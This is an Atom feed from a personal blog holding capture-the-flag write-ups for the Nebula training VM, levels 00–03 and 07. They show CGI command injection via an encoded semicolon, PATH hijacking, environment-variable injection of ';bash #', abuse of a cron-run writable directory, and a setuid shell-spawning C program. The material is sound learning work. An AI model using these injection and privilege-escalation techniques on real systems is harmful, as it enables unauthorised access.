&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-07/"&gt;Level 07&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;User &lt;code&gt;flag07&lt;/code&gt; is running CGI server, which is pinging provided host. Host is an parameter to URL. It means, we should be able to modify URL this way, to retrieve correct information.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;p&gt;I struggled with that for a while.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level07@nebula:/home/flag07$ wget localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;getflag
--2020-09-05 &lt;span class="m"&gt;20&lt;/span&gt;:31:46--  http://localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;
Resolving localhost... &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
Connecting to localhost&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="p"&gt;|&lt;/span&gt;:7007... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: unspecified &lt;span class="o"&gt;[&lt;/span&gt;text/html&lt;span class="o"&gt;]&lt;/span&gt;
index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;: Permission denied

Cannot write to &lt;span class="sb"&gt;`&lt;/span&gt;index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; (Permission denied).&lt;/span&gt;
&lt;span class="s1"&gt;getflag is executing on a non-flag account, this doesn&amp;#39;&lt;/span&gt;t count
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I wasn't sure, why it is not revealing flag. Finally, I searched through an internet for similar solution and found what's my mistake. I was using &lt;code&gt;;&lt;/code&gt; instead of &lt;code&gt;%3b&lt;/code&gt; which is encoded semicolon. Instead of sending my payload to website, I was sending &lt;code&gt;Host=localhost&lt;/code&gt; and later, I was running separate command, under my username.&lt;/p&gt;
&lt;p&gt;Rookie error.&lt;/p&gt;
&lt;h4&gt;Alternative solution&lt;/h4&gt;
&lt;p&gt;After retrieving &lt;code&gt;getflag&lt;/code&gt; I thought about another attempt to exploit a server. For this purpose, I used &lt;code&gt;exploit.c&lt;/code&gt; prepared for another level, and I sent this query:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level07@nebula:/tmp$ cat &amp;gt; exploitable.sh &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;span class="s"&gt;cp /tmp/exploit /home/flag07/exploit&lt;/span&gt;
&lt;span class="s"&gt;chmod u+s /home/flag07/exploit&lt;/span&gt;
&lt;span class="s"&gt;EOF&lt;/span&gt;
level07@nebula:/tmp$ wget localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;%3b/tmp/exploitable.sh
level07@nebula:/tmp$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag07
level07@nebula:/home/flag07$ ls
exploit  index.cgi  thttpd.conf
level07@nebula:/home/flag07$ ./exploit
flag07@nebula:/home/flag07$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;</content><category term="misc"></category><category term="learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Exploit Education - Nebula Part 1</title><link href="https://blog.smigiel.dev/exploit-education-nebula-part-1.html" rel="alternate"></link><published>2020-09-05T00:00:00-07:00</published><updated>2020-09-05T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-09-05:/exploit-education-nebula-part-1.html</id><summary type="html">&lt;h1&gt;&lt;a href="https://exploit.education/nebula/"&gt;Nebula&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;Basics&lt;/h2&gt;
&lt;p&gt;Nebula VM has 20 levels. Each level can be accessed with &lt;code&gt;levelXX&lt;/code&gt; username and the same password.&lt;/p&gt;
&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-00/"&gt;Level 00&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Search for all files, in all directories, belonging to &lt;code&gt;flag00&lt;/code&gt; user, with &lt;a href="https://en.wikipedia.org/wiki/Setuid"&gt;setuid&lt;/a&gt;. Redirect all "permission error" (stderr â€¦&lt;/p&gt;</summary><content type="html">&lt;h1&gt;&lt;a href="https://exploit.education/nebula/"&gt;Nebula&lt;/a&gt;&lt;/h1&gt;
&lt;h2&gt;Basics&lt;/h2&gt;
&lt;p&gt;Nebula VM has 20 levels. Each level can be accessed with &lt;code&gt;levelXX&lt;/code&gt; username and the same password.&lt;/p&gt;
&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-00/"&gt;Level 00&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Search for all files, in all directories, belonging to &lt;code&gt;flag00&lt;/code&gt; user, with &lt;a href="https://en.wikipedia.org/wiki/Setuid"&gt;setuid&lt;/a&gt;. Redirect all "permission error" (stderr) messages to &lt;code&gt;/dev/null&lt;/code&gt; discarding those messages.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level00@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
level00@nebula:~$ find / -type f -user flag00 -perm -0400 &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null
/bin/.../flag00
/home/flag00/.bash_logout
/home/flag00/.bashrc
/home/flag00/.profile
level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-01/"&gt;Level01&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Program allows to execute arbitrary program due to &lt;code&gt;system&lt;/code&gt; call for &lt;code&gt;echo&lt;/code&gt;.
Let's create fake echo with to run &lt;code&gt;bash&lt;/code&gt; session with &lt;code&gt;flag01&lt;/code&gt; UID.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level01@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
level01@nebula:~$ cat &amp;gt; /tmp/echo &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; #!/usr/bin/env bash&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; bash&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; EOF&lt;/span&gt;
level01@nebula:~$ chmod +x /tmp/echo
level01@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag01/
level01@nebula:/home/flag01$ ./flag01
and now what?
level01@nebula:/home/flag01$ &lt;span class="nv"&gt;PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/tmp:&lt;span class="nv"&gt;$PATH&lt;/span&gt; ./flag01
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-02/"&gt;Level02&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Program is reading &lt;code&gt;USER&lt;/code&gt; variable, which can be provided by attacker.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level02@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
level02@nebula:~$ &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;;bash #&amp;quot;&lt;/span&gt; /home/flag02/flag02
about to call system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/echo ;bash # is cool&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

flag02@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;a href="https://exploit.education/nebula/level-03/"&gt;Level03&lt;/a&gt;&lt;/h2&gt;
&lt;h4&gt;Solution&lt;/h4&gt;
&lt;p&gt;Cron is running script which is picking up content of &lt;code&gt;writable.d&lt;/code&gt; directory. It is executing whatever is there. It means, that anything what is running via cron, will have the same permissions.&lt;/p&gt;
&lt;h4&gt;Result&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level03@nebula:~$ getflag
getflag is executing on a non-flag account, this doesn&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;t count
level03@nebula:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~flag03
level03@nebula:/home/flag03$ cat &amp;gt; writable.d/flag &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; #!/usr/bin/env bash&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; getflag &amp;gt; /tmp/flag.result&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; EOF&lt;/span&gt;
level03@nebula:/home/flag03$ cat /tmp/flag.result
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Solution2&lt;/h4&gt;
&lt;p&gt;Prepare simple C program to gain bash access&lt;/p&gt;
&lt;h4&gt;Result2&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;gid_t&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="n"&gt;gid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getegid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;uid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;geteuid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="n"&gt;setresgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;setresuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;uid&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level03@nebula:/tmp$ cat &amp;gt; /home/flag03/writable.d/exploit.sh &lt;span class="s"&gt;&amp;lt;&amp;lt; EOF&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; #!/usr/bin/env bash&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; cp /tmp/exploit /home/flag03/exploitable&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; chmod u+s /home/flag03/exploitable&lt;/span&gt;
&lt;span class="s"&gt;&amp;gt; EOF&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Mistakes&lt;/h4&gt;
&lt;h5&gt;First&lt;/h5&gt;
&lt;p&gt;I tried to create copy of &lt;code&gt;exploit&lt;/code&gt; program in &lt;code&gt;/tmp&lt;/code&gt; directory. However, when I tried to run it, it didn't give me &lt;code&gt;flag03&lt;/code&gt; user. After looking into &lt;code&gt;/etc/fstab&lt;/code&gt; it became obvious:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;flag03@nebula:/home/flag03$ cat /etc/fstab&lt;/span&gt;
&lt;span class="err"&gt;overlayfs / overlayfs rw 0 0&lt;/span&gt;
&lt;span class="err"&gt;tmpfs /tmp tmpfs nosuid,nodev 0 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;tmpfs&lt;/code&gt; has &lt;code&gt;nosuid&lt;/code&gt; option. It means, that the nosuid mount option specifies that the filesystem cannot contain set userid files.&lt;/p&gt;
&lt;h5&gt;Second&lt;/h5&gt;
&lt;p&gt;When I found that &lt;code&gt;nosetuid&lt;/code&gt; is preventing from running program from within &lt;code&gt;/tmp&lt;/code&gt;, I decided to copy &lt;code&gt;exploit&lt;/code&gt; to &lt;code&gt;/home/level03&lt;/code&gt;. It failed, because default user running &lt;code&gt;writable.sh&lt;/code&gt; wasn't &lt;code&gt;root&lt;/code&gt; but &lt;code&gt;flag03&lt;/code&gt;. Solution was to copy payload to &lt;code&gt;/home/flag03&lt;/code&gt; directory.&lt;/p&gt;</content><category term="misc"></category><category term="learning"></category><category term="ctf"></category><category term="exploit"></category><category term="nebula"></category></entry><entry><title>Hello, world!</title><link href="https://blog.smigiel.dev/hello-world.html" rel="alternate"></link><published>2020-08-20T00:00:00-07:00</published><updated>2020-08-22T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-08-20:/hello-world.html</id><summary type="html">&lt;p&gt;Hey, I'm Dariusz. I'm cybersecurity wannabe.
This is an attempt to document my road to understand quirks of this world.&lt;/p&gt;
&lt;p&gt;Let me say it loud and clear. I don't like doing stuff "easy way". It is not something that I should be proud of. What I mean by that? I â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hey, I'm Dariusz. I'm cybersecurity wannabe.
This is an attempt to document my road to understand quirks of this world.&lt;/p&gt;
&lt;p&gt;Let me say it loud and clear. I don't like doing stuff "easy way". It is not something that I should be proud of. What I mean by that? I mean, that instead of starting writing, producing some content, I'm spending my time looking for "right" tool, "correct" template or anything like that. From the very beginning, blog layout needs to be pixel-perfect. There is no place for mistake. Everything needs to be perfect. But, can it be done differently?&lt;/p&gt;
&lt;p&gt;This is an attempt do it "new way". Instead of waiting, thinking, designing... let's produce some content.
Later, I can refine that. When time permits.&lt;/p&gt;</content><category term="misc"></category><category term="publishing"></category></entry></feed>